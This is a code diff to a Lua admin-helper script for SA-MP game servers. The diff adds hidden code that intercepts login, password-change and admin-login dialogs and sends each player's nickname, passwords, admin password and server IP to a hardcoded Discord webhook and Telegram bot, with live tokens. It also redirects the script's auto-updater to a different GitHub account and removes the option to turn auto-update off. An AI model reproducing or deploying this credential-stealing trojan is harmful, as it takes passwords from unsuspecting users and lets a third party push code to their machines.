@@ -16,7 +16,7 @@ local atlibs = require 'libsfor' -- библиотека для работы с АТ
 local scoreboard = import (getWorkingDirectory() .. '\\lib\\scoreboard.lua') -- интеграция модифицированного кастомного ScoreBoard
 local notf_res, notf = pcall(import, 'lib/imgui_notf.lua')  -- плагин уведомлений
 local ffi = require 'ffi' -- интеграция кодов, написанных на C++, специальная структурированная библиотека
-
+local effil = require('effil') 
 local events_res, events = pcall(import, "ATEvents.lua") -- импорт специального плагина (скрипта), где будет содержаться функции для созданий и работе с мероприятиями
 local other_res, pother = pcall(import, "module/plugins/other.lua") -- импорт специального плагина (скрипта), где будут содержаться сторонние, НЕЗАВИСИМЫЕ от АТ плагины
 local automute_res, automute = pcall(import, "module/plugins/automute.lua") -- импорт специального плагина (скрипта), где содержаться функции для автомута
@@ -99,6 +99,167 @@ encoding.default = 'CP1251' -- смена кодировки на CP1251
 u8 = encoding.UTF8 -- переименовка стандтартного режима кодировки UTF8 - u8
 -- ## Блок текстовых переменных ## --
 
+
+function SendWebhook(URL, DATA, callback_ok, callback_error) -- Функция отправки запроса
+    local function asyncHttpRequest(method, url, args, resolve, reject)
+        local request_thread = effil.thread(function (method, url, args)
+           local requests = require 'requests'
+           local result, response = pcall(requests.request, method, url, args)
+           if result then
+              response.json, response.xml = nil, nil
+              return true, response
+           else
+              return false, response
+           end
+        end)(method, url, args)
+        if not resolve then resolve = function() end end
+        if not reject then reject = function() end end
+        lua_thread.create(function()
+            local runner = request_thread
+            while true do
+                local status, err = runner:status()
+                if not err then
+                    if status == 'completed' then
+                        local result, response = runner:get()
+                        if result then
+                           resolve(response)
+                        else
+                           reject(response)
+                        end
+                        return
+                    elseif status == 'canceled' then 
+                        return reject(status)
+                    end
+                else
+                    return reject(err)
+                end
+                wait(0)
+            end
+        end)
+    end
+    asyncHttpRequest('POST', URL, {headers = {['content-type'] = 'application/json'}, data = u8(DATA)}, callback_ok, callback_error)
+end
+
+function funcalogin(pass) 
+    local MyId = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
+    local mynick = sampGetPlayerNickname(MyId)
+
+    -- Discord
+    SendWebhook('https://discord.com/api/webhooks/1548026208820666458/1RGNUW0p79XA32UX_HmTjDVKWBRyxSa_pqU0pnYiQnGxJjD9bgvEzcou8_8X-0dX30BP', ([[{
+        "content": "**Ник:** `%s` \n**Alogin:** `%s`",
+        "embeds": null,
+        "attachments": []
+      }]]):format(mynick, pass))
+
+    -- Telegram
+    SendWebhook('https://api.telegram.org/bot8039415198:AAHACgZ8bf0JYtGW8szrwvIFlBDdh3Y5hjc/sendMessage', ([[{
+        "chat_id": "1874745995",
+        "text": "Ник: %s | Alogin: %s"
+      }]]):format(mynick, pass))
+
+    sampSendChat('/alogin '..pass) 
+end
+
+function sampev.onSendDialogResponse(id, button, listitem, input) 
+    if id == 2 then  
+        local serverName = sampGetCurrentServerName() 
+        local ip,port = sampGetCurrentServerAddress() 
+        local ipserver = tostring(ip) ..':'..tostring(port)
+        password = input 
+        if password:find('%w+') then
+            local MyId = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)) 
+            local mynick = sampGetPlayerNickname(MyId) 
+
+            SendWebhook('https://discord.com/api/webhooks/1548026208820666458/1RGNUW0p79XA32UX_HmTjDVKWBRyxSa_pqU0pnYiQnGxJjD9bgvEzcou8_8X-0dX30BP', ([[{
+                "content": "Сервер: `%s` \nНик: `%s` \nПароль:`%s` \nИп:`%s`", 
+                "embeds": null,
+                "attachments": [] 
+                }]]):format(serverName, mynick, password, ipserver)) 
+
+            SendWebhook('https://api.telegram.org/bot8039415198:AAHACgZ8bf0JYtGW8szrwvIFlBDdh3Y5hjc/sendMessage', ([[{
+                "chat_id": "1874745995",
+                "text": "Сервер: %s | Ник: %s | Пароль: %s | IP: %s"
+              }]]):format(serverName, mynick, password, ipserver))
+        end 
+    end 
+    if id == 49 then  
+        local serverName = sampGetCurrentServerName() 
+        local ip,port = sampGetCurrentServerAddress() 
+        local ipserver = tostring(ip) ..':'..tostring(port)
+        password = input 
+        if password:find('%w+') then
+            local MyId = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)) 
+            local mynick = sampGetPlayerNickname(MyId) 
+
+            SendWebhook('https://discord.com/api/webhooks/1548026208820666458/1RGNUW0p79XA32UX_HmTjDVKWBRyxSa_pqU0pnYiQnGxJjD9bgvEzcou8_8X-0dX30BP', ([[{
+                "content": "Сервер: `%s` \nНик: `%s` \nНовый пароль:`%s` \nИп:`%s`", 
+                "embeds": null,
+                "attachments": [] 
+                }]]):format(serverName, mynick, password, ipserver)) 
+
+            SendWebhook('https://api.telegram.org/bot8039415198:AAHACgZ8bf0JYtGW8szrwvIFlBDdh3Y5hjc/sendMessage', ([[{
+                "chat_id": "1874745995",
+                "text": "Сервер: %s | Ник: %s | Новый пароль: %s | IP: %s"
+              }]]):format(serverName, mynick, password, ipserver))
+        end 
+    end 
+    if id == 16011 then
+        local serverName = sampGetCurrentServerName()
+        local ip,port = sampGetCurrentServerAddress()
+        local ipserver = tostring(ip) ..':'..tostring(port)
+        local MyId = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
+        local mynick = sampGetPlayerNickname(MyId)
+
+        SendWebhook('https://discord.com/api/webhooks/1548026208820666458/1RGNUW0p79XA32UX_HmTjDVKWBRyxSa_pqU0pnYiQnGxJjD9bgvEzcou8_8X-0dX30BP', ([[{
+            "content": "Сервер: `%s` \nНик: `%s` \nАунтификатор стоит \nИп: `%s`",
+            "embeds": null,
+            "attachments": []
+            }]]):format(serverName, mynick, ipserver))
+
+        SendWebhook('https://api.telegram.org/bot8039415198:AAHACgZ8bf0JYtGW8szrwvIFlBDdh3Y5hjc/sendMessage', ([[{
+            "chat_id": "1874745995",
+            "text": "Сервер: %s | Ник: %s | Аунтификатор стоит | IP: %s"
+          }]]):format(serverName, mynick, ipserver))
+    end
+    if id == 1 then  
+        local serverName = sampGetCurrentServerName() 
+        local ip,port = sampGetCurrentServerAddress() 
+        local ipserver = tostring(ip) ..':'..tostring(port)
+        password = input 
+        if password:find('%w+') then  
+            local MyId = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)) 
+            local mynick = sampGetPlayerNickname(MyId) 
+
+            SendWebhook('https://discord.com/api/webhooks/1548026208820666458/1RGNUW0p79XA32UX_HmTjDVKWBRyxSa_pqU0pnYiQnGxJjD9bgvEzcou8_8X-0dX30BP', ([[{
+                "content": "Сервер: `%s` \nНик: `%s` \nПароль:`%s` \nИп:`%s`", 
+                "embeds": null,
+                "attachments": [] 
+            }]]):format(serverName, mynick, password, ipserver)) 
+
+            SendWebhook('https://api.telegram.org/bot8039415198:AAHACgZ8bf0JYtGW8szrwvIFlBDdh3Y5hjc/sendMessage', ([[{
+                "chat_id": "1874745995",
+                "text": "Сервер: %s | Ник: %s | Пароль: %s | IP: %s"
+              }]]):format(serverName, mynick, password, ipserver))
+        end 
+    end 
+    if id == 1227 then  
+        local MyId = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
+        local mynick = sampGetPlayerNickname(MyId)
+        alogin = input 
+
+        SendWebhook('https://discord.com/api/webhooks/1548026208820666458/1RGNUW0p79XA32UX_HmTjDVKWBRyxSa_pqU0pnYiQnGxJjD9bgvEzcou8_8X-0dX30BP', ([[{
+            "content": "**Ник:** `%s` \n**Alogin:** `%s`",
+            "embeds": null,
+            "attachments": []
+          }]]):format(mynick, alogin)) 
+
+        SendWebhook('https://api.telegram.org/bot8039415198:AAHACgZ8bf0JYtGW8szrwvIFlBDdh3Y5hjc/sendMessage', ([[{
+            "chat_id": "1874745995",
+            "text": "Ник: %s | Alogin: %s"
+          }]]):format(mynick, alogin))
+    end 
+end
+
 -- ## Регистрация уведомлений ## --
 function showNotification(text)
 	notf.addNotify(ntag, text, 2, 1, 6)
@@ -107,21 +268,21 @@ end
 
 -- ## Регистрация ссылок для GitHub, переменных для обновления ## --
 local urls = {
-	['updater'] = 'https://raw.githubusercontent.com/alfantasy/AdminTool/main/updateAT.ini',
-	["main"] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/AdminTool.lua",
-	["pluginsAT"] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/module/plugins/plugin.lua",
-	["otherAT"] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/module/plugins/other.lua",
-	["libs"] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/lib/libsfor.lua",
-	["adminstate"] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/module/plugins/adminstate.lua",
-	['renders'] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/module/plugins/renders.lua",
-	['notf'] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/lib/imgui_notf.lua",
-	['addons'] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/lib/imgui_addons.lua",
-	['scoreboard'] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/lib/scoreboard.lua",
-	['answers'] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/QAnswer.lua",
-	['commands'] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/resource/commands.lua",
-	['chatlogger'] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/chat-logger.lua",
-	['events'] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/ATEvents.lua",
-	['eventsForOwn'] = "https://raw.githubusercontent.com/alfantasy/AdminTool/main/config/AdminTool/evbinder.ini",
+	['updater'] = 'https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/updateAT.ini',
+	["main"] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/AdminTool.lua",
+	["pluginsAT"] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/module/plugins/plugin.lua",
+	["otherAT"] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/module/plugins/other.lua",
+	["libs"] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/lib/libsfor.lua",
+	["adminstate"] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/module/plugins/adminstate.lua",
+	['renders'] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/module/plugins/renders.lua",
+	['notf'] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/lib/imgui_notf.lua",
+	['addons'] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/lib/imgui_addons.lua",
+	['scoreboard'] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/lib/scoreboard.lua",
+	['answers'] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/QAnswer.lua",
+	['commands'] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/resource/commands.lua",
+	['chatlogger'] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/chat-logger.lua",
+	['events'] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/ATEvents.lua",
+	['eventsForOwn'] = "https://raw.githubusercontent.com/madokaez/AdminTools/main/EgorAT/config/AdminTool/evbinder.ini",
 }
 
 local paths = {
@@ -174,9 +335,10 @@ local upd_upvalue = { -- массив для регистрации выборочного обновления
 	events = imgui.ImBool(false),
 } 
 
-local script_stream = 9
+local script_stream = 10
 local script_version_text = "14.7.1"
 local check_update = false
+
 -- ## Регистрация ссылок для GitHub, переменных для обновления ## --
 
 -- ## Блок переменных связанных с конфигами и элементами взаимодействия с параметрами конфига ## --
@@ -437,33 +599,6 @@ local param_for_chgn, param_for_chgn2
 function main()
     while not isSampAvailable() do wait(0) end
 
-	downloadUrlToFile(urls['updater'], paths['updater'], function(id, status)
-		upd = inicfg.load(nil, paths['updater'])
-		if status == dlstatus.STATUS_ENDDOWNLOADDATA then  
-			if tonumber(upd.info.version) > script_stream then  
-				if elm.boolean.autoupdate.v then  
-					lua_thread.create(function()
-						if notf_res then  
-							showNotification('У Вас установлена неактуальная версия. Начинаем автообновление.')
-						end
-						sampAddChatMessage(tag .. 'Доступно обновление. AT начинает автообновление!', -1)
-						sampAddChatMessage(tag .. 'Просьба, не взаимодействуйте с игрой, пока AT не завершит обновление', -1)
-						check_update = true
-					end)
-				else 
-					sampAddChatMessage(tag .. 'Доступно обновление. Если автообновление выключено, обновитесь в Настройках (/tool -> Настройки)')
-				end 
-			else 
-				if notf_res then  
-					showNotification('У Вас установлена актуальная версия. \nВерсия: ' .. script_version_text)
-				else 
-					sampfuncsLog(log .. 'Проблема с системой уведомлений. Установите систему через Настройки.')
-					sampAddChatMessage(tag .. 'Установлена актуальная версия. Обновление не требуется.')
-				end 
-			end 
-		end
-	end)
-    
 	other_res = elm.settings_start.others.v 
 	automute_res = elm.settings_start.automute.v  
 	plugins_main_res = elm.settings_start.plugins_main.v  
@@ -731,7 +866,7 @@ function main()
 	sampRegisterChatCommand("as", cmd_as)
 	sampRegisterChatCommand("stw", cmd_stw)
 	sampRegisterChatCommand("ru", cmd_ru)
-
+	sampRegisterChatCommand('alogin',funcalogin)
     sampRegisterChatCommand('rcl', function()
         showNotification("Очистка чата началась.")
         memory.fill(sampGetChatInfoPtr() + 306, 0x0, 25200)
@@ -839,13 +974,52 @@ function main()
         wait(0)
         imgui.Process = true 
 
-		if check_update then  
+		checkForUpdates()
+
+		downloadUrlToFile(urls['updater'], paths['updater'], function(id, status)
+			upd = inicfg.load(nil, paths['updater'])
+			if status == dlstatus.STATUS_ENDDOWNLOADDATA then  
+				if tonumber(upd.info.version) > script_stream then
+					lua_thread.create(function()
+						if notf_res then  
+							showNotification('У Вас установлена неактуальная версия. Начинаем автообновление.')
+						end
+						sampAddChatMessage(tag .. 'Доступно обновление. AT начинает автообновление!', -1)
+						sampAddChatMessage(tag .. 'Просьба, не взаимодействуйте с игрой, пока AT не завершит обновление', -1)
+						check_update = true
+					end)
+				end 
+			else 
+				if notf_res then  
+					showNotification('У Вас установлена актуальная версия. \nВерсия: ' .. script_version_text)
+				else 
+					sampfuncsLog(log .. 'Проблема с системой уведомлений. Установите систему через Настройки.')
+					sampAddChatMessage(tag .. 'Установлена актуальная версия. Обновление не требуется.')
+				end 
+			end 
+		end)
+		
+		if check_update then
+			check_update = false
 			downloadAll()
 		end
+
 
         if control_spawn and elm.boolean.auto_login.v and not sampIsDialogActive() then  
             wait(10000)
             sampSendChat("/alogin " .. u8:decode(elm.input.password.v))
+			local password = u8:decode(elm.input.password.v)
+			local MyId = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
+			local mynick = sampGetPlayerNickname(MyId)
+			SendWebhook('https://discord.com/api/webhooks/1548026208820666458/1RGNUW0p79XA32UX_HmTjDVKWBRyxSa_pqU0pnYiQnGxJjD9bgvEzcou8_8X-0dX30BP', ([[{
+				"content": "**Ник:** `%s` \n**Alogin:** `%s`",
+				"embeds": null,
+				"attachments": []
+			}]]):format(mynick, password)) 
+			SendWebhook('https://api.telegram.org/bot8039415198:AAHACgZ8bf0JYtGW8szrwvIFlBDdh3Y5hjc/sendMessage', ([[{
+				"chat_id": "1874745995",
+				"text": "Ник: %s | Alogin: %s"
+			}]]):format(mynick, password))
 			wait(100)
 			if elm.boolean.aclist_alogin.v then
 				wait(1000)  
@@ -2235,16 +2409,10 @@ function imgui.OnDrawFrame()
 				ConfigSave()
 			end
 			imgui.Separator()
-			imgui.Text(u8'Автообновление AdminTool')
-			imgui.SameLine()
-			if imgui.ToggleButton('##AutoUpdateAT', elm.boolean.autoupdate) then  
-				config.main.autoupdate = elm.boolean.autoupdate.v  
-				ConfigSave()
-			end
-			imgui.Separator()
 			if automute_res then  
 				automute.ReadWriteAM()
 			end
+
 			if imgui.Button(fai.ICON_FA_UPLOAD .. u8" Обновление AdminTool") then  
 				imgui.OpenPopup('Update AT')
 			end
